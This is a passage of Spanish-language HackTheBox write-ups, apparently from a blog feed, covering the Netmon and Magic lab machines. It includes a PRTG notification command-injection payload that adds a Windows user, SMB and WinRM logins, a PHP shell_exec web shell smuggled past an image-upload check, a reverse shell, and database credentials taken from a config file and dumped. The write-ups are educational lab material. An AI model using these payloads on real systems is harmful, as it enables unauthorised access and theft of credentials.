php &amp;gt; echo urldecode(&quot;name_=create_user&amp;amp;tags_=&amp;amp;active_=1&amp;amp;schedule_=-1%7CNone%7C&amp;amp;postpone_=1&amp;amp;comments=&amp;amp;summode_=2&amp;amp;summarysubject_=%5B%25sitename%5D+%25summarycount+Summarized+Notifications&amp;amp;summinutes_=1&amp;amp;accessrights_=1&amp;amp;accessrights_=1&amp;amp;accessrights_201=0&amp;amp;active_1=0&amp;amp;addressuserid_1=-1&amp;amp;addressgroupid_1=-1&amp;amp;address_1=&amp;amp;subject_1=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&amp;amp;contenttype_1=text%2Fhtml&amp;amp;customtext_1=&amp;amp;priority_1=0&amp;amp;active_17=0&amp;amp;addressuserid_17=-1&amp;amp;addressgroupid_17=-1&amp;amp;message_17=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&amp;amp;active_8=0&amp;amp;addressuserid_8=-1&amp;amp;addressgroupid_8=-1&amp;amp;address_8=&amp;amp;message_8=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&amp;amp;active_2=0&amp;amp;eventlogfile_2=application&amp;amp;sender_2=PRTG+Network+Monitor&amp;amp;eventtype_2=error&amp;amp;message_2=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&amp;amp;active_13=0&amp;amp;sysloghost_13=&amp;amp;syslogport_13=514&amp;amp;syslogfacility_13=1&amp;amp;syslogencoding_13=1&amp;amp;message_13=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&amp;amp;active_14=0&amp;amp;snmphost_14=&amp;amp;snmpport_14=162&amp;amp;snmpcommunity_14=&amp;amp;snmptrapspec_14=0&amp;amp;messageid_14=0&amp;amp;message_14=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&amp;amp;senderip_14=&amp;amp;active_9=0&amp;amp;url_9=&amp;amp;urlsniselect_9=0&amp;amp;urlsniname_9=&amp;amp;postdata_9=&amp;amp;active_10=0&amp;amp;active_10=10&amp;amp;address_10=Demo+EXE+Notification+-+OutFile.ps1&amp;amp;message_10=%22C%3A%5CUsers%5CPublic%5Ctester.txt%3Bnet+user+pentest+P3nT3st!+%2Fadd%22&amp;amp;windowslogindomain_10=&amp;amp;windowsloginusername_10=&amp;amp;windowsloginpassword_10=&amp;amp;timeout_10=60&amp;amp;active_15=0&amp;amp;accesskeyid_15=&amp;amp;secretaccesskeyid_15=&amp;amp;arn_15=&amp;amp;subject_15=&amp;amp;message_15=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&amp;amp;active_16=0&amp;amp;isusergroup_16=1&amp;amp;addressgroupid_16=200%7CPRTG+Administrators&amp;amp;ticketuserid_16=100%7CPRTG+System+Administrator&amp;amp;subject_16=%25device+%25name+%25status+%25down+(%25message)&amp;amp;message_16=Sensor%3A+%25name%0D%0AStatus%3A+%25status+%25down%0D%0A%0D%0ADate%2FTime%3A+%25datetime+(%25timezone)%0D%0ALast+Result%3A+%25lastvalue%0D%0ALast+Message%3A+%25message%0D%0A%0D%0AProbe%3A+%25probe%0D%0AGroup%3A+%25group%0D%0ADevice%3A+%25device+(%25host)%0D%0A%0D%0ALast+Scan%3A+%25lastcheck%0D%0ALast+Up%3A+%25lastup%0D%0ALast+Down%3A+%25lastdown%0D%0AUptime%3A+%25uptime%0D%0ADowntime%3A+%25downtime%0D%0ACumulated+since%3A+%25cumsince%0D%0ALocation%3A+%25location%0D%0A%0D%0A&amp;amp;autoclose_16=1&amp;amp;objecttype=notification&amp;amp;id=new&amp;amp;targeturl=%2Fmyaccount.htm%3Ftabid%3D2&quot;);

name_=create_user&amp;amp;tags_=&amp;amp;active_=1&amp;amp;schedule_=-1|None|&amp;amp;postpone_=1&amp;amp;comments=&amp;amp;summode_=2&amp;amp;summarysubject_=[%sitename] %summarycount Summarized Notifications&amp;amp;summinutes_=1&amp;amp;accessrights_=1&amp;amp;accessrights_=1&amp;amp;accessrights_201=0&amp;amp;active_1=0&amp;amp;addressuserid_1=-1&amp;amp;addressgroupid_1=-1&amp;amp;address_1=&amp;amp;subject_1=[%sitename] %device %name %status %down (%message)&amp;amp;contenttype_1=text/html&amp;amp;customtext_1=&amp;amp;priority_1=0&amp;amp;active_17=0&amp;amp;addressuserid_17=-1&amp;amp;addressgroupid_17=-1&amp;amp;message_17=[%sitename] %device %name %status %down (%message)&amp;amp;active_8=0&amp;amp;addressuserid_8=-1&amp;amp;addressgroupid_8=-1&amp;amp;address_8=&amp;amp;message_8=[%sitename] %device %name %status %down (%message)&amp;amp;active_2=0&amp;amp;eventlogfile_2=application&amp;amp;sender_2=PRTG Network Monitor&amp;amp;eventtype_2=error&amp;amp;message_2=[%sitename] %device %name %status %down (%message)&amp;amp;active_13=0&amp;amp;sysloghost_13=&amp;amp;syslogport_13=514&amp;amp;syslogfacility_13=1&amp;amp;syslogencoding_13=1&amp;amp;message_13=[%sitename] %device %name %status %down (%message)&amp;amp;active_14=0&amp;amp;snmphost_14=&amp;amp;snmpport_14=162&amp;amp;snmpcommunity_14=&amp;amp;snmptrapspec_14=0&amp;amp;messageid_14=0&amp;amp;message_14=[%sitename] %device %name %status %down (%message)&amp;amp;senderip_14=&amp;amp;active_9=0&amp;amp;url_9=&amp;amp;urlsniselect_9=0&amp;amp;urlsniname_9=&amp;amp;postdata_9=&amp;amp;active_10=0&amp;amp;active_10=10&amp;amp;address_10=Demo EXE Notification - OutFile.ps1&amp;amp;message_10=&quot;C:\Users\Public\tester.txt;net user pentest P3nT3st! /add&quot;&amp;amp;windowslogindomain_10=&amp;amp;windowsloginusername_10=&amp;amp;windowsloginpassword_10=&amp;amp;timeout_10=60&amp;amp;active_15=0&amp;amp;accesskeyid_15=&amp;amp;secretaccesskeyid_15=&amp;amp;arn_15=&amp;amp;subject_15=&amp;amp;message_15=[%sitename] %device %name %status %down (%message)&amp;amp;active_16=0&amp;amp;isusergroup_16=1&amp;amp;addressgroupid_16=200|PRTG Administrators&amp;amp;ticketuserid_16=100|PRTG System Administrator&amp;amp;subject_16=%device %name %status %down (%message)&amp;amp;message_16=Sensor: %name
Status: %status %down

&amp;amp;autoclose_16=1&amp;amp;objecttype=notification&amp;amp;id=new&amp;amp;targeturl=/myaccount.htm?tabid=2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos que la data se enviar a un parametro &lt;code&gt;message_10&lt;/code&gt;, en donde crea un usuario de nombre &lt;code&gt;pentest&lt;/code&gt; a nivel de sistema &lt;code&gt;net user pentest P3nT3st! /add&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Podemos aprovecharnos de este y ejecutar una instrucción similar a la del exploit, donde crearemos un usuario al cual pondre de nombre &lt;code&gt;pentest&lt;/code&gt; y ademas lo añadire al grupo de Administradores.&lt;/p&gt;

&lt;p&gt;Nos dirigimos a la ruta a donde manda la petición, damos en &lt;code&gt;Add new Notification&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Netmon/netmon6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Creamos un nombre de Notificación, en este caso &lt;code&gt;Nuevo&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Netmon/netmon9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;y ahora activamos la función &lt;code&gt;Execute Program&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Netmon/netmon10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;podemos ver varios inputs y si los inspeccionamos encontramos el de &lt;code&gt;message_10&lt;/code&gt; que corresponde a &lt;code&gt;Parameter&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Netmon/netmon8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ejecutamos en el campo la instrucción, donde crearemos nuestro usuario y lo añadiremos al grupo administrador.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Netmon/netmon11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Guardamos y ahora en la notificación creada le damos en el simbolo de la campana &lt;code&gt;Send&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Netmon/netmon12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Le damos ok en la confirmación y ya deberia haberse ejecutado la acción.&lt;/p&gt;

&lt;p&gt;Como vimos que el puerto &lt;code&gt;445&lt;/code&gt; esta abierto podemos usar &lt;code&gt;crackmapexec&lt;/code&gt; y validamos que el usuario &lt;code&gt;fmiracle&lt;/code&gt; ahora existe y forma parte de los usuarios &lt;code&gt;administradores&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ crackmapexec smb 10.10.10.152 -u 'pentest' -p 'p3nT3st!'
SMB         10.10.10.152    445    NETMON           [*] Windows Server 2016 Standard 14393 x64 (name:NETMON) (domain:netmon) (signing:False) (SMBv1:True)
SMB         10.10.10.152    445    NETMON           [+] netmon\pentest:p3nT3st! (Pwn3d!)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora haciendo uso del servicio de administración remota de windows, podemos conectarnos por el puerto &lt;code&gt;5985&lt;/code&gt;, usando la herramienta &lt;code&gt;evil-winrm&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ evil-winrm -i 10.10.10.152 -u 'pentest' -p 'p3nT3st!'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\pentest\Documents&amp;gt; cd C:\Users
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Una vez ya en el sistema podemos dirigirnos al directorio personal del usuario &lt;code&gt;Administrator&lt;/code&gt; y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;*Evil-WinRM* PS C:\Users&amp;gt; cd Administrator
*Evil-WinRM* PS C:\Users\Administrator&amp;gt; cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop&amp;gt; type root.txt
491b992fe825994a2fad4199afd2ca76
&lt;/code&gt;&lt;/pre&gt;

</description>
        <pubDate>Tue, 13 Jun 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Netmon</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Netmon</guid>
        
        <category>ftp enumeration</category>
        
        <category>absing PRTG Network Monitor</category>
        
        <category>Command Injection RCE</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
      <item>
        <title>Maquina Magic - htb writeup</title>
        <description>&lt;p&gt;En esta ocasión vamos a resolver la máquina &lt;code&gt;Magic&lt;/code&gt; de la plataforma de &lt;code&gt;hackthebox&lt;/code&gt; correspondiente a una &lt;code&gt;linux&lt;/code&gt; dificultad media, la cual explotaremos evadiendo el panel de logeo mediante una inyeccion simple en sql, despues aprovecharemos de una mala sanizitación de subida de archivos derivandola en una ejecución remota de comandos; una vez dentro del sistema obtendremos credenciales enumerando la base de datos y finamente aprocecharemos el permiso &lt;code&gt;suid&lt;/code&gt; de un binario, para ejecutar una &lt;code&gt;path hijacking&lt;/code&gt; que nos dara acceso como el usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Vamos a comenzar creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Magic
❯ ls
 Magic
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeracion&quot;&gt;Enumeración &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.185
PING 10.10.10.185 (10.10.10.185) 56(84) bytes of data.
64 bytes from 10.10.10.185: icmp_seq=1 ttl=63 time=137 ms

--- 10.10.10.185 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 137.232/137.232/137.232/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que la maquina nos responde, ahora procederemos a el escaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.185 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-13 21:00 GMT
Initiating SYN Stealth Scan at 21:00
Scanning 10.10.10.185 [65535 ports]
Discovered open port 80/tcp on 10.10.10.185
Discovered open port 22/tcp on 10.10.10.185
Completed SYN Stealth Scan at 21:00, 16.68s elapsed (65535 total ports)
Nmap scan report for 10.10.10.185
Host is up, received user-set (0.12s latency).
Scanned at 2023-06-13 21:00:26 GMT for 17s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 16.83 seconds
           Raw packets sent: 82274 (3.620MB) | Rcvd: 81681 (3.267MB)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Podemos ver que los puertos que se encuentran abiertos son el puerto &lt;code&gt;22 ssh&lt;/code&gt; y el &lt;code&gt;80 http&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p22,80 10.10.10.185 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-13 21:01 GMT
Nmap scan report for 10.10.10.185
Host is up (0.20s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.34 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Visulizamos informacion interesante de los puertos escaneados:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;SSH&lt;/td&gt;
      &lt;td&gt;OpenSSH 7.6p1 Ubuntu 4ubuntu0.3&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;80&lt;/td&gt;
      &lt;td&gt;HTTP&lt;/td&gt;
      &lt;td&gt;Apache httpd 2.4.29&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Seguidamente vamos a usar la herramienta &lt;code&gt;whatweb&lt;/code&gt; para ver por consola el gestor de contenido de la pagina web.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;❯ whatweb http://10.10.10.185
http://10.10.10.185 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.185], JQuery, Script, Title[Magic Portfolio]
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;explotación&quot;&gt;Explotación &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Vamos seguidamente a abrir la web en nuestro navegador.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Observamos una que la pagina se compone de una serie de imagenes y tambien podemos ver que existe un enlace a un login que procederemos a visitar.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Para tratar de averiguar la ruta donde sube las imagenes, podemos usar el inspeccionador de elementos y mostrar la ruta de donde cargan las imagenes que corresponde a &lt;code&gt;/uploads&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Probamos a tratar de logearnos con credenciales por defecto pero nos resulta imposible. Como estamos frente a un panel de logeo, podemos tratar de ocasionar un error en los inputs mediante una &lt;code&gt;sql injection&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como resultado podemos logramos logearnos exitosamente y nos redirige a un panel donde podemos subir una imagen. Para ver si bien sanitizada la subida de archivos, probaremos con subir un archivo de nombre &lt;code&gt;cmd.php&lt;/code&gt; que mediante el uso de etiquetas preformateadas y haciendo uso de la función &lt;code&gt;shell_exec&lt;/code&gt; con el parametro &lt;code&gt;cmd&lt;/code&gt; ejecutar comandos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;?php
  echo &quot;&amp;lt;pre&amp;gt;&quot; . shell_exec($_REQUEST['cmd']) . &quot;&amp;lt;/pre&amp;gt;&quot;;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Procedemos a subir el archivo pero vemos que solo admite formatos de imagen.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podemos probar a renombrar nuestro archivo &lt;code&gt;cmd.php&lt;/code&gt; y asignarle una doble extensión para asi tratar de bypasear la subida.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que esta vez cambie el mensaje de error, y detecta que estamos tratando de manipular la subida.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Debemos de tener en cuenta que en base a los &lt;code&gt;magic numbers&lt;/code&gt; que son los primeros bytes de los archivos se validan los tipos de archivos en este caso si con el comando &lt;code&gt;file&lt;/code&gt; tratamos de validar nuestro archivo &lt;code&gt;cmd.php.png&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ file cmd.php.png
cmd.php.png: PHP script, ASCII text
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nos detecta que es un &lt;code&gt;php script&lt;/code&gt;, pero si agregamos la cabezera &lt;code&gt;GIF8;&lt;/code&gt; al inicio de nuestro archivo ahora nos lo detectara como &lt;code&gt;gif image&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;❯ file cmd.php.png
cmd.php.png: GIF image data 16188 x 26736
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Probaremos a subir nuevamente el archivo modificado.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Obtenemos el mismo error, asi que esta vez vamos a descargar una imagen cualquier de &lt;code&gt;google&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora vamos a alterar su contenido añadiendo una intrucción en &lt;code&gt;php&lt;/code&gt; y añadiendo la extensión &lt;code&gt;.php&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Subimos nuevamente el archivo y esta vez nos lo hace correctamente.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic13.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic14.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vamos a la ruta donde se suben las imagenes que la obtuvimos previamente y efectivamente podemos ver nuestro archivo, aunque en un formato no legible por ser binario.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic15.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Validamos si podemos ejecutar comandos gracias a la instrucción php que añadimos y tenemos ejecución de comandos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic16.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora con bash vamos a enviarnos una reverse shell, para ello nos pondremos en escucha con &lt;code&gt;ncat&lt;/code&gt; en el puerto &lt;code&gt;443&lt;/code&gt; y obtenemos acceso como el usuario &lt;code&gt;www-data&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.185.
Ncat: Connection from 10.10.10.185:51270.
bash: cannot set terminal process group (1136): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/Magic/images/uploads$ whoami
whoami
www-data
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora como de costumbre vamos a otorgarnos una &lt;code&gt;tty full interactiva&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@ubuntu:/var/www/Magic/images/uploads$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@ubuntu:/var/www/Magic/images/uploads$ ^Z
zsh: suspended  ncat -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  ncat -nlvp 443
                                reset xterm
www-data@ubuntu:/var/www/Magic/images/uploads$ export TERM=xterm
www-data@ubuntu:/var/www/Magic/images/uploads$ export SHELL=bash 
www-data@ubuntu:/var/www/Magic/images/uploads$ stty rows 45 columns 184
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si volvemos al directorio &lt;code&gt;Magic&lt;/code&gt;, encontraremos un archivo &lt;code&gt;db.php5&lt;/code&gt; el cual contiene unas credenciales.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@ubuntu:/var/www/Magic$ ls
assets	db.php5  images  index.php  login.php  logout.php  upload.php
www-data@ubuntu:/var/www/Magic$ cat db.php5 
&amp;lt;?php
class Database
{
    private static $dbName = 'Magic' ;
    private static $dbHost = 'localhost' ;
    private static $dbUsername = 'theseus';
    private static $dbUserPassword = 'iamkingtheseus';

    private static $cont  = null;

    public function __construct() {
        die('Init function is not allowed');
    }

    public static function connect()
    {
        // One connection through whole application
        if ( null == self::$cont )
        {
            try
            {
                self::$cont =  new PDO( &quot;mysql:host=&quot;.self::$dbHost.&quot;;&quot;.&quot;dbname=&quot;.self::$dbName, self::$dbUsername, self::$dbUserPassword);
            }
            catch(PDOException $e)
            {
                die($e-&amp;gt;getMessage());
            }
        }
        return self::$cont;
    }

    public static function disconnect()
    {
        self::$cont = null;
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si tratamos de usar las credenciales para conectarnos como &lt;code&gt;theseus&lt;/code&gt;, vemos que no corresponde, pero podemos tratar de conectarnos a la base de datos. Y al no existir &lt;code&gt;mysql&lt;/code&gt;, podemos usar &lt;code&gt;mysqlshow&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@ubuntu:/var/www/Magic$ su theseus
Password: 
su: Authentication failure
www-data@ubuntu:/var/www/Magic$ mysqlshow -utheseus -piamkingtheseus
mysqlshow: [Warning] Using a password on the command line interface can be insecure.
+--------------------+
|     Databases      |
+--------------------+
| information_schema |
| Magic              |
+--------------------+
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Podemos enumerar las bases de datos utilizadas, y ahora usaremos &lt;code&gt;mysqldump&lt;/code&gt; para dumpear las datos  almancenados en la base de datos &lt;code&gt;Magic&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;www-data@ubuntu:/var/www/Magic$ mysqldump -utheseus -piamkingtheseus Magic
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- MySQL dump 10.13  Distrib 5.7.29, for Linux (x86_64)
--
-- Host: localhost    Database: Magic
-- ------------------------------------------------------
-- Server version	5.7.29-0ubuntu0.18.04.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
